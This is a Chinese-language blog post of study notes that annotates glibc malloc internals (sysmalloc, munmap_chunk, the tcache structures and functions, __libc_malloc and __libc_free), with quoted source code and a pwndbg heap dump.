<h2 id="声明并定义了一堆检查"><a href="#声明并定义了一堆检查" class="headerlink" title="声明并定义了一堆检查"></a>声明并定义了一堆检查</h2><p>一部分是用于开发人员调试，一部分是实际用户用的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> !MALLOC_DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_free_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_inuse_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_remalloced_chunk(A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloced_chunk(A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloc_state(A)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_chunk(A, P)              do_check_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_free_chunk(A, P)         do_check_free_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_inuse_chunk(A, P)        do_check_inuse_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloced_chunk(A, P, N)   do_check_malloced_chunk (A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloc_state(A)         do_check_malloc_state (A)</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>分析后面的代码需要时直接跳转回了看就行</p>
<h2 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc()"></a>sysmalloc()</h2><p>当_int_malloc()函数尝试从 fast bins，last remainder chunk，small bins，large bins 和 top chunk 都失败之后，就会使用 sYSMALLOc()函数直接向系统申请内存用于分配所需的 chunk。 其实现源代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[开始]</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">[检查 av 和请求大小]</span><br><span class="line">   |</span><br><span class="line">   +---是---&gt; [尝试 mmap 分配] ---&gt; [设置返回块] ---&gt; [结束]</span><br><span class="line">   |</span><br><span class="line">   +---否---&gt; [记录并检查当前top chunk]</span><br><span class="line">                   |</span><br><span class="line">                   v</span><br><span class="line">           [尝试扩展当前堆]</span><br><span class="line">                   |</span><br><span class="line">           +---是---&gt; [更新 av-&gt;system_mem]</span><br><span class="line">           |</span><br><span class="line">           +---否---&gt; [使用 MORECORE]</span><br><span class="line">                             |</span><br><span class="line">                             v</span><br><span class="line">                  [检查 MORECORE 返回值]</span><br><span class="line">                             |</span><br><span class="line">                 +---是---&gt; [对齐和更新]</span><br><span class="line">                 |</span><br><span class="line">                 +---否---&gt; [返回 ENOMEM]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>值得注意：</p>
<ul>
<li><code> _int_free (av, old_top, 1);</code>在179行</li>
<li><code> _int_free (av, old_top, 1);</code>在451行</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ----------- Routines dealing with system allocation -------------- */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   sysmalloc 处理从系统请求更多内存的 malloc 情况。</span></span><br><span class="line"><span class="comment">   进入时，假设 av-&gt;top 没有足够的空间来满足 nb 字节的请求，</span></span><br><span class="line"><span class="comment">   因此需要扩展或替换 av-&gt;top。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr old_top;              <span class="comment">/* incoming value of av-&gt;top */</span></span><br><span class="line">  INTERNAL_SIZE_T old_size;       <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">char</span> *old_end;                  <span class="comment">/* its end address */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> size;                      <span class="comment">/* arg to first MORECORE or mmap call */</span></span><br><span class="line">  <span class="type">char</span> *brk;                      <span class="comment">/* return value from MORECORE */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> correction;                <span class="comment">/* arg to 2nd MORECORE call */</span></span><br><span class="line">  <span class="type">char</span> *snd_brk;                  <span class="comment">/* 2nd return val */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">/* unusable bytes at front of new space */</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">/* partial page left at end of new space */</span></span><br><span class="line">  <span class="type">char</span> *aligned_brk;              <span class="comment">/* aligned offset into brk */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr p;                    <span class="comment">/* the allocated/returned chunk */</span></span><br><span class="line">  mchunkptr remainder;            <span class="comment">/* remainder from allocation */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;   <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO (dl_pagesize);</span><br><span class="line">  <span class="type">bool</span> tried_mmap = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         如果支持 mmap，并且请求的大小符合 mmap 阈值，    128kb</span></span><br><span class="line"><span class="comment">         并且系统支持 mmap，并且当前分配的 mmap 区域数量足够少，</span></span><br><span class="line"><span class="comment">         那么尝试直接映射此请求，而不是扩展 top。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br></pre></td></tr></table></figure>

<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap()分配的内存块小于设定的最大值，将使用mmap()系统调用直接向操作系统申请内存。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    try_mmap:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         将大小向上舍入到最近的页面。</span></span><br><span class="line"><span class="comment">         对于通过 mmap 获取的块，开销比普通块多一个 SIZE_SZ 单位，因为没有后续块的 prev_size 字段可以使用。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         请参见下面的 front_misalign 处理，对于 glibc，除非我们有高对齐需求，否则不需要进一步的对齐处理。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">        size = ALIGN_UP (nb + SIZE_SZ, pagesize);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        size = ALIGN_UP (nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);</span><br><span class="line">      tried_mmap = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>由于 nb 为所需 chunk 的大小，在_int_malloc()函数中已经将用户需要分配的大小转化为 chunk 大小，当如果这个 chunk 直接使用 mmap()分配的话，该 chunk 不存在下一个相邻的 chunk，也就没有 prev_size 的内存空间可以复用，所以还需要额外 SIZE_SZ 大小的内存。由 于 mmap()分配的内存块必须页对齐。如果使用 mmap()分配内存，需要重新计算分配的内存 大小 size。</p>
<h2 id="systrim"><a href="#systrim" class="headerlink" title="systrim()"></a>systrim()</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   systrim 在某种程度上是 sysmalloc 的反向操作。</span></span><br><span class="line"><span class="comment">   它通过对 sbrk 传递负参数，将未使用的内存返还给系统（如果在 malloc 池的“高”端有未使用的内存）。</span></span><br><span class="line"><span class="comment">   当 top 空间超过修整阈值时，它会被 free() 自动调用。</span></span><br><span class="line"><span class="comment">   它也可以被公共的 malloc_trim 例程调用。如果实际释放了任何内存，则返回 1，否则返回 0。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="munmap"><a href="#munmap" class="headerlink" title="munmap()"></a>munmap()</h2><p><code>munmap_chunk</code> 函数用于<strong>释放</strong>通过内存映射分配的内存块</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">munmap_chunk</span> <span class="params">(mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO (dl_pagesize); <span class="comment">// 获取系统页面大小</span></span><br><span class="line">  INTERNAL_SIZE_T size = chunksize (p); <span class="comment">// 获取当前块的大小</span></span><br><span class="line"></span><br><span class="line">  assert (chunk_is_mmapped (p)); <span class="comment">// 确保该块是一个内存映射块</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果该块是一个在转储主区域中的伪内存映射块，则不执行任何操作。</span></span><br><span class="line"><span class="comment">     我们从不释放这块内存。  */</span></span><br><span class="line">  <span class="keyword">if</span> (DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">uintptr_t</span> mem = (<span class="type">uintptr_t</span>) chunk2mem (p); <span class="comment">// 获取块的内存地址</span></span><br><span class="line">  <span class="type">uintptr_t</span> block = (<span class="type">uintptr_t</span>) p - prev_size (p); <span class="comment">// 计算块的起始地址</span></span><br><span class="line">  <span class="type">size_t</span> total_size = prev_size (p) + size; <span class="comment">// 计算总大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 不幸的是，我们必须手动完成编译器的工作。通常我们会分别测试</span></span><br><span class="line"><span class="comment">     BLOCK 和 TOTAL-SIZE 是否符合页面大小的要求。但 gcc 目前并不</span></span><br><span class="line"><span class="comment">     识别优化的可能性，因此我们在位测试之前将两个值合并为一个。 */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely ((block | total_size) &amp; (pagesize - <span class="number">1</span>)) != <span class="number">0</span></span><br><span class="line">      || __glibc_unlikely (!powerof2 (mem &amp; (pagesize - <span class="number">1</span>))))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;munmap_chunk(): 无效的指针&quot;</span>); <span class="comment">// 输出错误信息</span></span><br><span class="line"></span><br><span class="line">  atomic_decrement (&amp;mp_.n_mmaps); <span class="comment">// 减少内存映射块计数</span></span><br><span class="line">  <span class="type">atomic_add</span> (&amp;mp_.mmapped_mem, -total_size); <span class="comment">// 减少映射内存的总量</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果 munmap 失败，进程的虚拟内存地址空间处于不良状态。</span></span><br><span class="line"><span class="comment">     只是让块悬挂在那里，进程很快就会终止，因为无能为力。 */</span></span><br><span class="line">  __munmap ((<span class="type">char</span> *) block, total_size); <span class="comment">// 尝试释放内存</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以后闲了再看吧，直接看tcache，malloc()和free()</p>
<h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><p>在glibc2.29之后加入了key变量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*------------------------ Public wrappers. --------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 每个线程都有一个这样的结构体，</span></span><br><span class="line"><span class="comment">   它包含每个线程的缓存（因此称为“tcache_perthread_struct”）。</span></span><br><span class="line"><span class="comment">   保持总体大小较小是稍微重要的。</span></span><br><span class="line"><span class="comment">   请注意，COUNTS 和 ENTRIES 是冗余的（我们本可以每次只计算链表的长度），但这是出于性能考虑。 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<h3 id="tcache-puts"><a href="#tcache-puts" class="headerlink" title="tcache_puts()"></a>tcache_puts()</h3><p>将chunk放入tcache中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 调用者必须确保我们知道 tc_idx 是有效的，并且有足够的空间</span></span><br><span class="line"><span class="comment">   存放更多的块。 */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将这个块标记为“在 tcache 中”，以便在 _int_free 中测试</span></span><br><span class="line"><span class="comment">         可以检测到重复释放。 */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><p>从tcache中拿走chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 调用者必须确保 tc_idx 是有效的，并且有可移除的内存块。 */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="tcache-thread-shutdown"><a href="#tcache-thread-shutdown" class="headerlink" title="tcache_thread_shutdown()"></a>tcache_thread_shutdown()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>;</span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">	&#123;</span><br><span class="line">	  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">	  tcache_tmp-&gt;entries[i] = e-&gt;next;</span><br><span class="line">	  __libc_free (e);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init()"></a>tcache_init()</h3><p>这里重要的就是<code>_int_malloc (ar_ptr, bytes);</code>他分配了每次程序运行起来后哪个0x290的chunk，这个chunk里面就是本线程的tcache的所有信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56493e4e9000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56493e4e9290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56493e4e92b0</span><br><span class="line">Size: 0x20d50 (with flag bits: 0x20d51)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);<span class="comment">//*</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="libc-malloc-1"><a href="#libc-malloc-1" class="headerlink" title="__libc_malloc()"></a>__libc_malloc()</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">_Static_assert</span> (PTRDIFF_MAX &lt;= SIZE_MAX / <span class="number">2</span>,</span><br><span class="line">                  <span class="string">&quot;PTRDIFF_MAX is not more than half of SIZE_MAX&quot;</span>);</span><br><span class="line"><span class="comment">//存在hook函数则执行hook函数</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="comment">//若tcache启用，首先使用tcache来分配chunk</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;tbytes))</span><br><span class="line">    &#123;<span class="comment">//获取 nb+2*SIZE_SZ (0x10在64位中) 的大小，并判断</span></span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//tcache不满足的话，再用_int_malloc()，下面这些和单多线程有关</span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">	      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure>

<h2 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="__libc_free()"></a>__libc_free()</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"><span class="comment">//有hook函数调用hook函数</span></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* 查看动态的 brk/mmap 阈值是否需要调整。</span></span><br><span class="line"><span class="comment">		转储的虚假 mmap 块不会影响该阈值。 */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">	  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);<span class="comment">//这个就是前面那个munmap()释放通过内存映射(mmap)分配的内存块</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);<span class="comment">//调用_int_free()</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></table></figure>

<h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc()"></a>malloc()</h2><p>初始化声明变量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="type">size_t</span> tcache_unsorted_count;	    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

